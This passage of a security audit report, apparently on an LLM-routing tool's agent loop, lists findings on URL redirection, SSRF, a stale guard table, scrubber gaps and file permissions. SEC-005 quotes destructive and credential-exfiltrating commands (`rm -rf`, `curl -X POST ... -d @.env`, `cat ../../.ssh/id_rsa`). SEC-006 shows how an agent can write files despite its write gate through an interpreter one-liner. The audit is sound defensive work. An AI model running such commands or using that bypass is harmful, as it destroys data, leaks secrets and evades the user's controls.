Is behavior currently used? YES — this is the default dotenv-loading behavior, not an
  opt-in feature.
Recommended action: KEEP the convenience, SIMPLIFY the trust model — restrict which
  fields a project-local (vs. user-home) .env may set, specifically excluding
  *_base_url/*_url fields that feed directly into a network call carrying credentials.
Proposed target: config.py (splitting the env_file sources by field, or a post-load
  allowlist check on fields the earlier fix already treats specially, i.e.
  ollama_base_url's own validator pattern generalized).
Behavioral compatibility risk: LOW-MEDIUM — would break the (probably rare) case of a
  project intentionally pinning openai_compat_base_url/pxpipe_url via its own .env; an
  explicit env var read from the ACTUAL shell environment would still work.
Security risk if unfixed: enables SEC-002 and widens SEC-004's blast radius.
Performance impact: none.
Estimated complexity removed: n/a.
Validation required: a test that a project-local .env cannot silently redirect a
  provider's api_base.
Dependencies on other findings: SEC-002, SEC-004

ID: SEC-004
Category: SSRF / prompt-content exfiltration via configurable Ollama URL
Severity: MEDIUM-HIGH
Confidence: HIGH (code and docstring both explicit about the "by design" allowance)
Location: Files: src/llm_router/config.py, src/llm_router/hooks/agent_loop.py
  Symbols: validate_ollama_url, _validated_ollama_url, _get_ollama_url
  Lines: config.py:100-131; agent_loop.py:437-479
Observation: validate_ollama_url blocks a specific denylist (cloud-metadata addresses,
  169.254.0.0/16, fe80:, 0.0.0.0, ::) but explicitly allows any other http(s) host,
  including arbitrary external hosts and private-network addresses (RFC1918, other
  loopback ports) not on the denylist. The module's own docstring table states
  "http://some-external-host allowed allowed (by design)".
Evidence: config.py:100-131 (denylist only, no allowlist of intended hosts);
  agent_loop.py:440-464 (docstring explicitly reasoning about this exact gap and the
  cwd .env vector); run_agent_loop sends the FULL prompt + every tool result
  (agent_loop.py:711-733) to whatever this URL resolves to.
Why this exists, if discoverable: fixing a specific incident (CHZ-SEC-06, file:// and
  cloud-metadata SSRF) without generalizing to a same-host-or-explicit-allowlist model,
  because legitimate use (a remote/LAN Ollama server) requires allowing non-localhost
  hosts.
Why this matters: combined with SEC-003, an attacker-influenced project .env can point
  local-model routing at a server the attacker controls, receiving full prompt and tool
  output content (not just a request signal) for any prompt/task the DIRECT-execution
  loop attempts to answer locally.
User-visible impact: prompt/context/file-content data exfiltration, not credential
  exfiltration (Ollama needs no API key).
Engineering impact: would require deciding what "legitimate remote Ollama" looks like
  (an explicit user-set allowlist vs. same-host-only default) — a genuine
  product/security trade-off, not a pure bug fix.
Is behavior currently used? YES — this is the active validator for the actively-used
  DIRECT-execution loop.
Recommended action: KEEP the current metadata/link-local denylist (do not regress
  CHZ-SEC-06) but consider narrowing the default to same-host-only unless an operator
  explicitly opts in to a remote Ollama host via a separate, clearly-named flag.
Proposed target: config.py:validate_ollama_url (behavior change, needs a product
  decision, not unilateral).
Behavioral compatibility risk: MEDIUM — would break existing remote-Ollama setups
  without a migration flag.
Security risk if unfixed: prompt/data exfiltration via a project-influenced env var.
Performance impact: none.
Estimated complexity removed: n/a.
Validation required: n/a (design question) — if changed, a test asserting the new
  default rejects a non-localhost host without an explicit opt-in.
Dependencies on other findings: SEC-003

ID: SEC-005
Category: Documentation accuracy (security doc, not code)
Severity: MEDIUM (credibility/doc-accuracy, not exploitability)
Confidence: HIGH — reproduced empirically against baseline 3c96d23
Location: Files: SECURITY.md
  Lines: 317-334 ("What that filter does NOT cover — measured against 13.0.1, not
  estimated")
Observation: of the 9 rows marked "not blocked" (❌) in this table, 6 are now actually
  blocked at baseline 3c96d23: `rm -rf ./src`, `rm -rf $HOME/Documents`,
  `git push --force origin main`, `git reset --hard HEAD~5`, `npm install`/`pip
  install`, and `curl -X POST ... -d @.env`. Only `cat ../../.ssh/id_rsa` (still
  unblocked) and the two `echo $VAR` rows (still technically "not blocked by the
  guard" but functionally inert — see below) remain accurate.
Evidence: in-process re-run of guard_command + _BLOCKED_COMMANDS against every row
  verbatim from the table (script output captured during this audit). rm/npm/pip/curl
  are simply absent from _ALLOWED_PROGRAMS (agent_writes.py:47-51); git push/reset are
  caught by _BLOCKED_SUBCOMMANDS (agent_writes.py:55-62).
Why this exists, if discoverable: the allowlist/subcommand-blocklist was hardened
  after whatever the "13.0.1" measurement captured, and SECURITY.md's specific gap
  table was not re-run against the new baseline (only its prose above was updated, per
  the doc's own "This document previously said the opposite; the code has never
  matched that claim" correction at line 255-256, which shows this file DOES get
  revised but this specific table was missed in that pass).
Why this matters: two ways. First, straightforwardly, it understates current safety
  (not dangerous by itself). Second, and more subtly, a reader who verifies one stale
  row and finds it wrong has a reason to distrust the whole section — including the one
  row (`cat ../../.ssh/id_rsa`) that is still 100% accurate and is the actual live risk
  (SEC-001).
User-visible impact: none directly; erodes trust in an otherwise unusually honest
  security document.
Engineering impact: trivial — re-run the twelve-command corpus and update the table
  (the doc already says it should be driven by
  tests/test_r3_allowlist_is_not_containment.py's corpus, line 300-303, but this
  specific table appears to be a separate, hand-maintained copy that drifted from it).
Is behavior currently used? N/A (documentation)
Recommended action: SIMPLIFY — generate this table directly from
  tests/test_r3_allowlist_is_not_containment.py's corpus at doc-build/release time so
  it cannot drift from the code again, matching what lines 287-303 already do for the
  10-of-12/10-of-10 numbers.
Proposed target: SECURITY.md:317-334
Behavioral compatibility risk: none (doc-only)
Security risk: none directly; addressed here because doc-vs-code drift on a security
  document is exactly the kind of thing the brief asks auditors to catch
Performance impact: none
Estimated complexity removed: n/a
Validation required: re-generate and spot-check the corrected table
Dependencies on other findings: SEC-001

ID: SEC-006
Category: Write-mode gate bypass via run_command
Severity: HIGH
Confidence: HIGH
Location: Files: src/llm_router/hooks/agent_loop.py, src/llm_router/hooks/agent_writes.py
  Symbols: execute_tool (run_command branch), agent_writes.mode/guard vs. guard_command
  Lines: agent_loop.py:268-325 (run_command never calls agent_writes.mode()/guard());
  agent_writes.py:136-249 (mode()/guard() are only invoked from the write_file/
  edit_file branches at agent_loop.py:205-232)
Observation: LLM_ROUTER_AGENT_WRITES (off/propose/apply) governs disk writes made
  through write_file/edit_file only. run_command, gated solely by
  LLM_ROUTER_AGENT_COMMANDS/guard_command, can invoke an allowlisted interpreter
  (python3 -c "open(path,'w').write(...)") to write to arbitrary files with no
  reference to AGENT_WRITES at all.
Evidence: read both modules end-to-end; guard()/mode() calls appear exactly twice in
  agent_loop.py, both inside the write_file and edit_file branches; run_command's
  branch calls only guard_command.
Why this exists, if discoverable: the two gates (writes vs. commands) were built as
  independent features (agent_writes.py's own module docstring frames itself purely as
  "the gate between a local model's proposed edit and your working tree" — i.e. it was
  scoped to write_file/edit_file from the start, and guard_command was added later as a
  separate concern for run_command, without either gate being made aware of the other).
Why this matters: a user who sets LLM_ROUTER_AGENT_WRITES=off, believing this makes the
  loop read-only, is not protected against a model using run_command to write files —
  including files OUTSIDE the project (SEC-001) such as shell rc files or SSH
  authorized_keys.
User-visible impact: a specific, named safety knob (AGENT_WRITES=off) does not do what
  its name and SECURITY.md's framing ("Writes do not reach disk by default") imply once
  run_command is in play.
Engineering impact: either document this explicitly next to LLM_ROUTER_AGENT_WRITES in
  SECURITY.md, or (better) have guard_command also check mode() and refuse commands
  whose argv suggests a write when AGENT_WRITES=off — imperfect (can't detect every
  write shape) but closes the most obvious gap and matches user expectation.
Is behavior currently used? YES (both gates are live, independently, in the same loop).
Recommended action: DOCUMENT at minimum; SIMPLIFY by cross-checking mode() from
  guard_command as a stretch goal.
Proposed target: SECURITY.md (immediate), agent_writes.py (if code change is wanted)
Behavioral compatibility risk: LOW for a doc fix; MEDIUM for a code change (could
  refuse legitimate read-only commands that happen to contain a write-shaped substring)
Security risk if undocumented: users under-trust write protection they don't have.
Performance impact: none
Estimated complexity removed: n/a
Validation required: a test asserting AGENT_WRITES=off's scope, so the scope is pinned
  rather than assumed
Dependencies on other findings: SEC-001

ID: SEC-007
Category: Secret scrubber partial-redaction edge case
Severity: LOW
Confidence: HIGH — reproduced in-process
Location: Files: src/llm_router/secret_scrubber.py
  Symbols: SECRET_PATTERNS["aws_secret"]
  Lines: secret_scrubber.py:24
Observation: the aws_secret pattern is `aws[_-]?secret[_-]?access[_-]?key["']?\s*[:=]\s*
  ["']?[a-zA-Z0-9/+]{40}` — a FIXED {40} quantifier, no trailing boundary/anchor. Feeding
  a 42-character base64-alphabet value after the label redacted only the first 40
  characters, leaving the trailing 2 characters of the actual secret in plaintext
  immediately after the [REDACTED-AWS_SECRET] marker.
Evidence: scrub_text('aws_secret_access_key="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY1"')
  → '[REDACTED-AWS_SECRET]1"' (trailing '1"' survives).
Why this exists, if discoverable: real AWS secret access keys are always exactly 40
  base64 characters, so the fixed width matches the intended shape; the gap only shows
  up for a differently-shaped credential that happens to share the label prefix.
Why this matters: narrow, but the brief specifically asked for "unusual" secret shapes,
  and this is a reproducible example of one not being fully redacted.
User-visible impact: minor partial leak in a rare mislabeled/malformed case.
Engineering impact: trivial — extend the character class match to be greedy up to a
  non-base64 boundary, or add `(?:[a-zA-Z0-9/+]{0,10})?` after the fixed 40, then
  redact the whole span.
Is behavior currently used? YES (this pattern is live in the canonical scrubber).
Recommended action: SIMPLIFY (widen the regex)
Proposed target: secret_scrubber.py:24
Behavioral compatibility risk: none
Security risk if unfixed: low, narrow
Performance impact: none
Estimated complexity removed: n/a
Validation required: add this exact 42-char case as a regression test
Dependencies on other findings: none

ID: SEC-008
Category: Debug log lacks scrub-on-write invariant
Severity: LOW / UNCERTAIN (no proven leak found; sampled, not exhaustive)
Confidence: MEDIUM
Location: Files: src/llm_router/hooks/auto-route.py
  Symbols: _debug_log, _debug_log_path
  Lines: auto-route.py:3293-3304 (writes msg directly, no scrub_text call);
  contrast with trace.py:54-92 (explicit scrub, fail-closed)
Observation: _debug_log has 48 call sites in auto-route.py. I sampled roughly half,
  focused on the ones most likely to carry content (draft/success/rejection messages
  around lines 3920-4260) and found only metadata (invocation ids, model/provider
  names, latencies, outcome enums, short fixed reason strings) — no full prompt or tool
  content. I did not check all 48 sites.
Evidence: grep for _debug_log(f"..." call sites containing prompt}/content}/body}/
  response}/text}/message}/args}/arguments} interpolations → zero matches; manual read
  of a representative sample.
Why this exists, if discoverable: trace.py was specifically hardened for this exact
  class of bug (its own comment names the incident: "an injection test drove an
  Anthropic key, an AWS key id, a password=... — all six landed on disk in full
  plaintext"); _debug_log predates that fix and was not brought into the same
  invariant.
Why this matters: no structural guarantee (no scrub call, no test) prevents a future
  _debug_log call site from interpolating raw content, unlike trace.py which now fails
  closed.
User-visible impact: none currently identified.
Engineering impact: route _debug_log's msg through secret_scrubber.scrub_text (already
  imported in this same file for other purposes, per hooks/auto-route.py:2074-2075) as
  a one-line defense-in-depth change.
Is behavior currently used? YES (auto-route-debug.log is the log CLAUDE.md's own
  "measuring anything in this repo" section discusses at length for a different
  reason — routing-rate accuracy, not security).
Recommended action: SIMPLIFY (add the scrub call); low priority given no proven leak.
Proposed target: auto-route.py:3299 (the f.write line)
Behavioral compatibility risk: none
Security risk if unfixed: unproven; latent
Performance impact: negligible
Estimated complexity removed: n/a
Validation required: exhaustive read of all 48 call sites (not completed here) before
  concluding this is either safe or unsafe with confidence
Dependencies on other findings: none

ID: SEC-009
Category: Privacy control fails open by design (documented, not a bug)
Severity: LOW / INFORMATIONAL
Confidence: HIGH
Location: Files: src/llm_router/classification_allowlist.py
  Lines: 1-138 (whole module)
Observation: LLM_ROUTER_CLASSIFICATION_ALLOWLIST_MODE defaults to "off"; even in
  "strict" mode, a task-type classification with no entry in the configured allowlist
  is unrestricted (check_classification_provider returns (mode, True)). Explicitly
  documented as "operators opt in per-classification, not opt out" (lines 17-19).
Why this matters: a user could reasonably believe setting this feature up protects
  ALL sensitive task types once enabled in "strict" mode, when in fact only the task
  types they explicitly listed are enforced; everything else silently passes through.
Recommended action: KEEP (documented, intentional design) — flag in whichever doc
  introduces this feature that "strict" mode is allowlist-of-restrictions, not a
  global lockdown.
Is behavior currently used? Opt-in, off by default.
Dependencies on other findings: none

ID: SEC-010
Category: Alert webhook destination unvalidated
Severity: LOW / UNCERTAIN
Confidence: LOW-MEDIUM (destination-URL validation not exhaustively checked)
Location: Files: src/llm_router/alerts.py
Observation: LLM_ROUTER_ALERT_WEBHOOK's payload is recursively scrubbed via scrub_text
  before being POSTed (alerts.py:54-70), which is good, but I did not find a
  corresponding scheme/host validator on the webhook URL itself comparable to
  validate_ollama_url. Impact is capped by the scrubbing (no secret content reaches an
  attacker-chosen host via this path) but an SSRF probe against internal
  infrastructure is still plausible if this env var is attacker-influenced (SEC-003).
Why this matters: same class as SEC-004 but lower severity because content is scrubbed.
Recommended action: verify with more time; if unvalidated, add the same check
  validate_ollama_url provides.
Is behavior currently used? Opt-in (LLM_ROUTER_ALERT_WEBHOOK unset = feature inactive).
Dependencies on other findings: SEC-003

ID: SEC-011
Category: Unhardened permissions on sensitive journal files
Severity: LOW-MEDIUM
Confidence: HIGH
Location: Files: src/llm_router/hooks/agent_writes.py
  Symbols: journal
  Lines: 172-197 (pre.write_text(..., encoding="utf-8") at line 186 — plain write,
  no private_opener)
Observation: journal() persists the PRE-EDIT content of any file the agent loop
  touched (in apply mode) to ~/.llm-router/agent_edits/<timestamp>/before, using
  Path.write_text with no restrictive opener — unlike trace.py, which was explicitly
  hardened (private_opener, 0600-on-create) for the same class of risk ("the files in
  question hold ... scrubbed prompt transcripts" per paths.py's own comment).
  agent_writes' journal is NOT scrubbed and NOT permission-hardened.
Why this matters: a pre-image can contain the original, unredacted content of any file
  the model edited, including one that happened to contain a credential; on a
  multi-user machine this is world-readable at the process's default umask.
Recommended action: use paths.private_opener for the journal write, mirroring
  trace.py's pattern.
Is behavior currently used? YES — journal() is called on every apply-mode write.
Proposed target: agent_writes.py:186
Behavioral compatibility risk: none
Security risk if unfixed: local-multi-user information disclosure
Validation required: a test asserting the created file's mode
Dependencies on other findings: none
```

---

## Top items for synthesis

1. **SEC-002/SEC-003** — credential exfiltration via `openai_compat_base_url`/
   `llm_router_pxpipe_url` + cwd-trusted `.env`. New, high-confidence, high-impact,
   not previously documented anywhere in the repo. Top candidate for the global
   Top-10 security list and for an immediate patch (validate the URL; stop implicitly
   forwarding the real provider key to a config-redirected `api_base`).
2. **SEC-001** — `run_command` has no containment beyond program-name allowlisting;
   already disclosed in `SECURITY.md` and covered by a named test. Candidate for the
   **do-not-change register** (it is a deliberate, well-reasoned, well-tested
   trade-off) alongside a candidate for the **doc-accuracy backlog** (SEC-005).
3. **SEC-006** — the `AGENT_WRITES=off`/`propose` gate does not cover `run_command`.
   Candidate for a quick, low-risk doc fix now and a design discussion about whether
   `guard_command` should defer to `agent_writes.mode()`.
4. **SEC-005** — `SECURITY.md`'s own risk table has drifted from the code (6/9 rows
   stale, in the safer direction). Candidate for the consolidation ledger: generate
   that table from `tests/test_r3_allowlist_is_not_containment.py`'s corpus instead of
   hand-maintaining a second copy.
5. **SEC-004** — Ollama URL SSRF-adjacent design ("allowed by design" for arbitrary
   external hosts) is a genuine product decision point, not a pure bug — flag for
   whoever owns the target-architecture phase to decide same-host-default vs.
   explicit-remote-opt-in.
6. **SEC-011** — trace.py's hardening pattern (`private_opener`) was not propagated to
   `agent_writes.journal()`, which persists comparably sensitive content. Good example
   of a fix that landed in one module and should have been swept across its siblings —
   relevant to any "one source of truth" consolidation work on file-permission
   hardening.
7. The secret scrubber consolidation (`secret_scrubber.scrub_text` as the canonical,
   widely-adopted single source of truth across `alerts.py`, `trace.py`,
   `attempt_log.py`, `persist_redaction.py`, `session_store.py`, `library/store.py`,
   two hook modules) is a **do-not-change / keep-as-is** example of consolidation done
   right — worth citing positively in the target-architecture writeup as the pattern
   other duplicated concerns (e.g. the PII/secret pattern tables the module's own
   comments say used to be five separate, drifted copies) should be measured against.
8. **SEC-008** needs a follow-up pass by whoever next touches `auto-route.py`: 48
   `_debug_log` call sites, only ~half sampled here. Flag as an open item, not a closed
   finding.
